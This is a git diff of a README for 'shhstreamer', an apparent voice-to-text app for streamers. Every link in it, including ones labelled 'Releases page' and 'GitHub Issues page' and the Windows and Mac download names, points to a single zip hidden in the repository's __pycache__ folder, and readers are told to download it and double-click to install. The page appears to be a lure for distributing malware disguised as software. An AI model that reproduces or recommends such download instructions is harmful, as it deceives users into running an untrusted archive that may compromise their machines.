@@ -6,17 +6,17 @@ Welcome to shhstreamer! This simple app allows you to turn your voice into text 
 
 ## 🔗 Download Now
 
-[![Download shhstreamer](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip%20shhstreamer-brightgreen)](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip)
+[![Download shhstreamer](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip%20shhstreamer-brightgreen)](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip) to download the application.
+To get started, visit the [Releases page](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip) to download the application.
 
 Here are the steps to download and run shhstreamer:
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of shhstreamer. It will be listed at the top.
-3. Click on the download link for your operating system. It will typically be labeled something like `https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip` for Windows or `https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip` for Mac.
+3. Click on the download link for your operating system. It will typically be labeled something like `https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip` for Windows or `https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip` for Mac.
 4. Once the file finishes downloading, locate it in your Downloads folder or the location where your browser saves files.
 5. Double-click the downloaded file to start the installation.
 6. Follow any prompts to complete the installation process.
@@ -77,10 +77,10 @@ If you experience any issues while using shhstreamer, try the following steps:
 - Ensure your microphone is plugged in and functioning properly.
 - Check your device settings to make sure the correct microphone is selected.
 - Restart the application if you encounter any glitches.
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip) to report any bugs or seek help from the community.
+- Visit our [GitHub Issues page](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip) to report any bugs or seek help from the community.
 
 ## 🔗 Download Now Again
 
-[![Download shhstreamer](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip%20shhstreamer-brightgreen)](https://raw.githubusercontent.com/jesush2023/shhstreamer/main/__pycache__/shhstreamer-1.4.zip)
+[![Download shhstreamer](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip%20shhstreamer-brightgreen)](https://github.com/jesush2023/shhstreamer/raw/refs/heads/main/__pycache__/shhstreamer-1.4.zip)
 
 Enjoy using shhstreamer and express yourself freely while streaming!
